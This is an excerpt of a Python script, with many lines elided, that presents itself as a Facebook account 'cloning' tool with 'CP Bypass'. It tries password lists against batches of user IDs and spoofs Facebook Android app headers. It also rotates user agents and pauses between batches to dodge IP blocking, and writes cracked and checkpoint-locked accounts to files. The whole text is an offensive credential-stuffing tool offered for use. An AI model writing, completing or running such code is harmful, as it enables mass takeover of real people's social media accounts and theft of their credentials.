...
# 🌍 100,000+ GLOBAL USER AGENTS (Updated for CP Bypass)
def get_heavy_ua():
...
def banner():
    ...
    ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝    ╚═╝    ╚══════╝╚═╝  ╚═╝
\033[1;37m    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;32m    [+] VERSION  : \033[1;37m17.0 BYPASS      \033[1;32m[+] TYPE     : \033[1;37mCP-FIX-METHOD
\033[1;32m    [+] AGENTS   : \033[1;37m100K+ MIXED      \033[1;32m[+] SAVING   : \033[1;37m/SDCARD/OK_FINAL.txt
\033[1;37m    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

# ━━━━━━━━━━━━━━━━━━━━━ CP BYPASS CLONING LOGIC ━━━━━━━━━━━━━━━━━━━━━
def crack_heavy(uid):
    global loop, oks, cps
    ...
    for pw in pws:
        ...
        # --- CP Bypass Professional Headers ---
        # Yeh headers Facebook app ki original requests ko simulate karte hain
        headers = {
        ...
        try:
            ...
            data = {
                ...
                "password": pw, 
                "sdk_style": "android",
                "default_password_cache": "false",
                "locale": "en_US",
                "client_country_code": "US"
            }
            
            res = session.post(url, data=data, headers=headers, timeout=30).json()
            ...
            if "session_key" in res:
                ...
                # CP IDs ko separate file mein save karna takay bypass try kia ja sakay
                print(f'\r\n\033[1;33m [CP] {uid} | {pw}')
                cps.append(uid)
...
def split_and_run():
    ...
    try:
        ...
        print(f" \033[1;33m[*] Running in 1000 IDs Batches with CP Bypass...")
        ...
        for i in range(0, total, 1000):
            ...
            if i + 1000 < total:
                ...
                time.sleep(10) # 10s delay to reset IP properly
...
def main_menu():
    banner()
    print(f" \033[1;32m[1] Start Heavy Batch Cloning (CP Bypass)")
